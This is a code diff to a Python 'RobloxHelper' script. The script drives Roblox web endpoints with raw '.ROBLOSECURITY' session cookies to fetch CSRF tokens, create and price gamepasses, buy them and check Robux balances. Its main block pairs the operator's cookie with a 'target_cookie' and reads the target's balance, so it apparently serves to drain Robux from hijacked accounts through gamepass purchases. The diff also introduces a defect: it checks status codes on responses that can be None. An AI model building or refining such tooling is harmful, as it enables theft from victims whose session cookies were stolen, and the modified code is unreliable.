@@ -9,17 +9,21 @@ class RobloxHelper:
 
     def _make_request(self, method, url, **kwargs):
         try:
-            response = self.session.request(method, url, **kwargs)
-            response.raise_for_status()
+            if method == "GET":
+                response = self.session.get(url, **kwargs)
+            elif method == "POST":
+                response = self.session.post(url, **kwargs)
+            else:
+                return None
             return response
-        except requests.exceptions.RequestException as e:
-            logging.error(f"Request failed: {e}")
+        except Exception as e:
+            logging.error(f"Error: {e}")
             return None
 
     def obtain_csrf(self, cookie):
         headers = {"Cookie": f".ROBLOSECURITY={cookie}"}
         response = self._make_request("POST", "https://auth.roblox.com/v2/logout", headers=headers)
-        if response:
+        if response.status_code == 403:
             return response.headers.get('X-Csrf-Token')
         return None
 
@@ -28,7 +32,7 @@ class RobloxHelper:
         data = {"IsForSale": True, "Price": price}
         headers = {"Cookie": f".ROBLOSECURITY={cookie}", "X-Csrf-Token": csrf}
         response = self._make_request("POST", url, json=data, headers=headers)
-        if response:
+        if response.status_code == 200:
             logging.info(f"Successfully changed price of gamepass {gamepass_id} to {price}")
         else:
             logging.error(f"Failed to change price of gamepass {gamepass_id} to {price}")
@@ -40,7 +44,7 @@ class RobloxHelper:
         data = {"Name": name, "Description": description, "UniverseId": universe_id, "File": None, "AssetId": None}
         headers = {"Cookie": f".ROBLOSECURITY={cookie}", "X-Csrf-Token": csrf}
         response = self._make_request("POST", url, data=data, headers=headers)
-        if response:
+        if response.status_code == 200:
             logging.info("Successfully uploaded gamepass")
             return response.json().get('gamePassId')
         else:
@@ -49,18 +53,18 @@ class RobloxHelper:
             logging.error(f"Error: {response.text}")
             return None
             
-     def get_user_id(self, cookie):
+    def get_user_id(self, cookie):
         url = "https://users.roblox.com/v1/users/authenticated"
         headers = {"Cookie": f".ROBLOSECURITY={cookie}"}
         response = self._make_request("POST", url, headers=headers)
-        if response:
+        if response.status_code == 200:
            return response.json().get('id')
 
     def scan_for_place(self, cookie):
         url = "https://users.roblox.com/v1/users/authenticated"
         headers = {"Cookie": f".ROBLOSECURITY={cookie}"}
         response = self._make_request("POST", url, headers=headers)
-        if response:
+        if response.status_code == 200:
             user_id = response.json().get('id')
             url = f"https://games.roblox.com/v2/users/{user_id}/games?accessFilter=2&limit=10&sortOrder=Desc"
             response = self._make_request("GET", url, headers=headers)
@@ -74,7 +78,7 @@ class RobloxHelper:
         gamepass_url = f"https://apis.roblox.com/game-passes/v1/game-passes/{gamepass_id}/product-info"
         headers = {"Cookie": f".ROBLOSECURITY={cookie}"}
         response = self._make_request("GET", gamepass_url, headers=headers)
-        if not response:
+        if not response.status_code == 200:
             return None
 
         gamepass_price = response.json().get('PriceInRobux')
@@ -83,7 +87,7 @@ class RobloxHelper:
         headers = {"Cookie": f".ROBLOSECURITY={cookie}", "X-Csrf-Token": csrf}
         response = self._make_request("POST", purchase_url, json=data, headers=headers)
 
-        if response:
+        if response.status_code == 200:
             logging.info(f"Successfully purchased gamepass {gamepass_id}")
         else:
             logging.error(f"Failed to purchase gamepass {gamepass_id}")
@@ -94,7 +98,7 @@ class RobloxHelper:
         url = f"https://economy.roblox.com/v1/users/{user_id}/currency"
         headers = {"Cookie": f".ROBLOSECURITY={cookie}"}
         response = self._make_request("GET", url, headers=headers)
-        if response:
+        if response.status_code == 200:
             robux = response.json().get('robux')
             return robux
         return None
@@ -119,11 +123,12 @@ class RobloxHelper:
         return [val for val in amount_list if val > 0]
 
 if __name__ == "__main__":
-    cookie = "cookie"
-    target_cookie = "target cookie"
+    cookie = ""
+    target_cookie = ""
     roblox_helper = RobloxHelper()
     csrf = roblox_helper.obtain_csrf(cookie)
     target_csrf = roblox_helper.obtain_csrf(target_cookie)
+    print(csrf)
     target_userid = roblox_helper.get_user_id(cookie)
     robux = roblox_helper.check_robux(target_cookie, target_userid)
     universe_id = roblox_helper.scan_for_place(cookie)
